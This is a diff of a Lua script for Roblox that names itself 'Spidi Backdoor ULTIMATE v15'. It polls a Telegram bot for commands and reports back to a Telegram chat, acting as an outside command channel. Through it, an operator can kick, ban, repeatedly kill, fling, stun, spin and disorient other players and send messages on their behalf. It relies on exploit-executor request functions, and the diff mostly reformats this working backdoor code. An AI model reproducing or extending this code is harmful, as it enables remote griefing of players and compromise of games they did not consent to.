@@ -28,23 +28,39 @@ local TweenService = game:GetService("TweenService")
 
 local function httpRequest(url, method, headers, body)
     local f = syn and syn.request or http and http.request or http_request or fluxus and fluxus.request or request
-    if not f then return nil end
-    local args = { Url = url, Method = method or "GET", Headers = headers or {} }
-    if body then args.Body = body end
+    if not f then
+        return nil
+    end
+    local args = {
+        Url = url,
+        Method = method or "GET",
+        Headers = headers or {}
+    }
+    if body then
+        args.Body = body
+    end
     local ok, res = pcall(f, args)
-    if ok and res then return res else return nil end
+    if ok and res then
+        return res
+    else
+        return nil
+    end
 end
 
 local function sendMessage(text)
-    if not CHAT_ID then return end
-    local payload = { chat_id = CHAT_ID, text = text, parse_mode = "HTML" }
-    httpRequest("https://api.telegram.org/bot"..BOT_TOKEN.."/sendMessage", "POST",
-        { ["Content-Type"] = "application/json" },
-        HttpService:JSONEncode(payload))
+    if not CHAT_ID then
+        return
+    end
+    local payload = {
+        chat_id = CHAT_ID,
+        text = text,
+        parse_mode = "HTML"
+    }
+    httpRequest("https://api.telegram.org/bot"..BOT_TOKEN.."/sendMessage", "POST", {["Content-Type"] = "application/json"}, HttpService:JSONEncode(payload))
 end
 
 local function getChatId()
-    local res = httpRequest("https://api.telegram.org/bot"..BOT_TOKEN.."/getUpdates")
+    local res = httpRequest("https://api.telegram.org/bot"..BOT_TOKEN.."/getUpdates", "GET", {})
     if res and res.Body then
         local ok, data = pcall(HttpService.JSONDecode, HttpService, res.Body)
         if ok and data and data.result and #data.result > 0 then
@@ -77,7 +93,6 @@ local function findPlayer(input)
     if not input or input == "" then
         return nil, "❌ Введи ник или номер"
     end
-    
     if input:lower() == "all" then
         local all = {}
         for _, p in pairs(Players:GetPlayers()) do
@@ -87,19 +102,16 @@ local function findPlayer(input)
         end
         return all, "all"
     end
-    
     local users = {}
     for _, p in pairs(Players:GetPlayers()) do
         if scriptUsers[p.UserId] then
             table.insert(users, p)
         end
     end
-    
     local num = tonumber(input)
     if num and users[num] then
         return users[num]
     end
-    
     input = input:lower()
     local matches = {}
     for _, p in pairs(users) do
@@ -133,9 +145,13 @@ local function getScriptUserList()
 end
 
 local function playMusic(target, soundId)
-    if not target or not soundId then return end
+    if not target or not soundId then
+        return
+    end
     local oldSound = target:FindFirstChild("ClientMusic")
-    if oldSound then oldSound:Destroy() end
+    if oldSound then
+        oldSound:Destroy()
+    end
     local sound = Instance.new("Sound")
     sound.Name = "ClientMusic"
     sound.SoundId = "rbxassetid://" .. tostring(soundId)
@@ -146,7 +162,9 @@ local function playMusic(target, soundId)
 end
 
 local function stopMusic(target)
-    if not target then return false end
+    if not target then
+        return false
+    end
     local sound = target:FindFirstChild("ClientMusic")
     if sound then
         sound:Stop()
@@ -169,9 +187,13 @@ end
 
 local function desorientPlayer(target)
     local char = target.Character
-    if not char then return end
+    if not char then
+        return
+    end
     local camera = Workspace.CurrentCamera
-    if not camera then return end
+    if not camera then
+        return
+    end
     camera.CameraType = Enum.CameraType.Scriptable
     local startTime = tick()
     local connection
@@ -181,11 +203,7 @@ local function desorientPlayer(target)
             camera.CameraType = Enum.CameraType.Custom
             return
         end
-        camera.CFrame = camera.CFrame * CFrame.Angles(
-            math.rad(math.random(-15, 15)),
-            math.rad(25),
-            math.rad(math.random(-10, 10))
-        )
+        camera.CFrame = camera.CFrame * CFrame.Angles(math.rad(math.random(-15, 15)), math.rad(25), math.rad(math.random(-10, 10)))
     end)
 end
 
@@ -197,7 +215,9 @@ local function toggleFps()
 end
 
 local function sayMessage(target, msg)
-    if not target then return end
+    if not target then
+        return
+    end
     local chatChannel = TextChatService.TextChannels:FindFirstChild("RBXGeneral")
     if chatChannel then
         chatChannel:SendAsync(msg)
@@ -215,14 +235,18 @@ end
 local stunnedPlayers = {}
 local function stunPlayer(target)
     local char = target.Character
-    if not char then return end
+    if not char then
+        return
+    end
     local hum = char:FindFirstChild("Humanoid")
-    if not hum then return end
+    if not hum then
+        return
+    end
     local origSpeed = hum.WalkSpeed
     local origJump = hum.JumpPower
     hum.WalkSpeed = 0
     hum.JumpPower = 0
-    stunnedPlayers[target.UserId] = { speed = origSpeed, jump = origJump }
+    stunnedPlayers[target.UserId] = {speed = origSpeed, jump = origJump}
     task.delay(3, function()
         if stunnedPlayers[target.UserId] then
             local data = stunnedPlayers[target.UserId]
@@ -238,18 +262,18 @@ end
 
 local function flingPlayer(target)
     local char = target.Character
-    if not char then return end
+    if not char then
+        return
+    end
     local hrp = char:FindFirstChild("HumanoidRootPart")
     local hum = char:FindFirstChildOfClass("Humanoid")
-    if not (hrp and hum) then return end
+    if not (hrp and hum) then
+        return
+    end
     hum.Sit = true
     local dirX = math.random() > 0.5 and 1 or -1
     local dirZ = math.random() > 0.5 and 1 or -1
-    hrp.AssemblyLinearVelocity = Vector3.new(
-        math.random(200, 400) * dirX,
-        math.random(300, 500),
-        math.random(200, 400) * dirZ
-    )
+    hrp.AssemblyLinearVelocity = Vector3.new(math.random(200, 400) * dirX, math.random(300, 500), math.random(200, 400) * dirZ)
 end
 
 local spinningPlayers = {}
@@ -260,14 +284,20 @@ local function spinPlayer(target, speed)
         spinningPlayers[target.UserId] = nil
     end
     local char = target.Character
-    if not char then return end
+    if not char then
+        return false
+    end
     local hrp = char:FindFirstChild("HumanoidRootPart")
-    if not hrp then return end
+    if not hrp then
+        return false
+    end
     local running = true
-    spinningPlayers[target.UserId] = { running = true }
+    spinningPlayers[target.UserId] = {running = true}
     spawn(function()
         while running and spinningPlayers[target.UserId] and spinningPlayers[target.UserId].running do
-            if not target.Character then break end
+            if not target.Character then
+                break
+            end
             local h = target.Character:FindFirstChild("HumanoidRootPart")
             if h then
                 h.CFrame = h.CFrame * CFrame.Angles(0, math.rad(18 * speed), 0)
@@ -297,7 +327,9 @@ end
 local function showNotification(target, text, duration)
     duration = duration or 5
     local gui = target:FindFirstChild("PlayerGui")
-    if not gui then return end
+    if not gui then
+        return
+    end
     local screen = Instance.new("ScreenGui")
     screen.Name = "SpidiNotif"
     screen.ResetOnSpawn = false
@@ -336,7 +368,6 @@ local function showNotification(target, text, duration)
     game:GetService("Debris"):AddItem(screen, duration)
 end
 
--- ==================== ОБРАБОТЧИК КОМАНД ====================
 local function handleCommand(cmd, args)
     local info = "👤 Hacker228\n🔗 https://www.roblox.com/games/"..game.PlaceId
     
@@ -418,7 +449,11 @@ local function handleCommand(cmd, args)
     
     if cmd == "setfps" then
         local state = toggleFps()
-        sendMessage("🎮 FPS лимит: "..(state and "10 (включён)" or "60 (выключен)"))
+        if state then
+            sendMessage("🎮 FPS лимит: 10 (включён)")
+        else
+            sendMessage("🎮 FPS лимит: 60 (выключен)")
+        end
         return
     end
     
@@ -444,12 +479,7 @@ local function handleCommand(cmd, args)
             sendMessage("❌ /announce [текст]")
             return
         end
-        StarterGui:SetCore("SendNotification", {
-            Title = "",
-            Text = msg,
-            Duration = 10,
-            Icon = ""
-        })
+        StarterGui:SetCore("SendNotification", {Title = "", Text = msg, Duration = 10, Icon = ""})
         sendMessage("✅ Объявление: "..msg)
         return
     end
@@ -498,7 +528,6 @@ local function handleCommand(cmd, args)
         return
     end
     
-    -- ========== ПОЛУЧЕНИЕ ЦЕЛЕЙ ==========
     local input = args[1]
     if not input then
         sendMessage("❌ Укажи ник/номер/all")
@@ -522,7 +551,7 @@ local function handleCommand(cmd, args)
     end
     
     if type(targets) ~= "table" then
-        targets = { targets }
+        targets = {targets}
     end
     
     local filtered = {}
@@ -539,7 +568,9 @@ local function handleCommand(cmd, args)
     end
     
     local reason = table.concat(args, " ", 2)
-    if reason == input then reason = "" end
+    if reason == input then
+        reason = ""
+    end
     
     for _, target in pairs(targets) do
         if cmd == "ban" and bannedPlayers[target.UserId] then
@@ -557,14 +588,30 @@ local function handleCommand(cmd, args)
         local humanoid = char and char:FindFirstChild("Humanoid")
         
         if cmd == "kick" then
-            target:Kick(reason ~= "" and reason or "Kicked by Spidi Backdoor")
+            if reason ~= "" then
+                target:Kick(reason)
+            else
+                target:Kick("Kicked by Spidi Backdoor")
+            end
             kickedPlayers[target.UserId] = true
-            sendMessage("✅ Кикнут: <b>"..target.Name.."</b>"..(reason ~= "" and " (Причина: "..reason..")" or ""))
+            if reason ~= "" then
+                sendMessage("✅ Кикнут: <b>"..target.Name.."</b> (Причина: "..reason..")")
+            else
+                sendMessage("✅ Кикнут: <b>"..target.Name.."</b>")
+            end
             
         elseif cmd == "ban" then
-            target:Kick(reason ~= "" and reason or "Banned by Spidi Backdoor")
+            if reason ~= "" then
+                target:Kick(reason)
+            else
+                target:Kick("Banned by Spidi Backdoor")
+            end
             bannedPlayers[target.UserId] = true
-            sendMessage("✅ Забанен: <b>"..target.Name.."</b>"..(reason ~= "" and " (Причина: "..reason..")" or ""))
+            if reason ~= "" then
+                sendMessage("✅ Забанен: <b>"..target.Name.."</b> (Причина: "..reason..")")
+            else
+                sendMessage("✅ Забанен: <b>"..target.Name.."</b>")
+            end
             
         elseif cmd == "unban" then
             if bannedPlayers[target.UserId] then
@@ -593,7 +640,7 @@ local function handleCommand(cmd, args)
             
         elseif cmd == "fly" and hrp then
             local bv = Instance.new("BodyVelocity")
-            bv.MaxForce = Vector3.new(1,1,1)*1e8
+            bv.MaxForce = Vector3.new(1, 1, 1) * 1e8
             bv.Velocity = Vector3.new(0, 50, 0)
             bv.Parent = hrp
             Debris:AddItem(bv, 5)
@@ -611,8 +658,8 @@ local function handleCommand(cmd, args)
             local pos = hrp.Position
             for i = 1, 100 do
                 local p = Instance.new("Part")
-                p.Size = Vector3.new(5,5,5)
-                p.Position = pos + Vector3.new(math.random(-50,50), math.random(-50,50), math.random(-50,50))
+                p.Size = Vector3.new(5, 5, 5)
+                p.Position = pos + Vector3.new(math.random(-50, 50), math.random(-50, 50), math.random(-50, 50))
                 p.Anchored = true
                 p.Parent = Workspace
                 Debris:AddItem(p, 2)
@@ -626,7 +673,9 @@ local function handleCommand(cmd, args)
         elseif cmd == "loopkill" and humanoid then
             spawn(function()
                 for i = 1, 10 do
-                    if not target or not target.Character then break end
+                    if not target or not target.Character then
+                        break
+                    end
                     local hum = target.Character:FindFirstChild("Humanoid")
                     if hum then
                         hum.Health = 0
@@ -660,8 +709,8 @@ local function handleCommand(cmd, args)
             local pos = hrp.Position
             for i = 1, 30 do
                 local p = Instance.new("Part")
-                p.Size = Vector3.new(3,3,3)
-                p.Position = pos + Vector3.new(math.random(-20,20), math.random(-20,20), math.random(-20,20))
+                p.Size = Vector3.new(3, 3, 3)
+                p.Position = pos + Vector3.new(math.random(-20, 20), math.random(-20, 20), math.random(-20, 20))
                 p.Anchored = true
                 p.Material = Enum.Material.Neon
                 p.BrickColor = BrickColor.new("Bright red")
@@ -738,7 +787,6 @@ local function handleCommand(cmd, args)
     end
 end
 
--- ==================== УВЕДОМЛЕНИЯ ====================
 local oldPlayers = {}
 local function checkNewPlayers()
     for _, p in pairs(Players:GetPlayers()) do
@@ -758,10 +806,9 @@ spawn(function()
     end
 end)
 
--- ==================== ОПРОС TELEGRAM ====================
 local lastId = 0
 local function pollUpdates()
-    local res = httpRequest("https://api.telegram.org/bot"..BOT_TOKEN.."/getUpdates?offset="..(lastId+1))
+    local res = httpRequest("https://api.telegram.org/bot"..BOT_TOKEN.."/getUpdates?offset="..(lastId + 1), "GET", {})
     if res and res.Body then
         local ok, data = pcall(HttpService.JSONDecode, HttpService, res.Body)
         if ok and data and data.result then
@@ -773,7 +820,7 @@ local function pollUpdates()
                         sendMessage("✅ Spidi Backdoor ULTIMATE v15 запущен!\n👤 Hacker228")
                     end
                     local text = msg.text
-                    if text:sub(1,1) == "/" then
+                    if text:sub(1, 1) == "/" then
                         local parts = {}
                         for w in string.gmatch(text, "%S+") do
                             table.insert(parts, w)
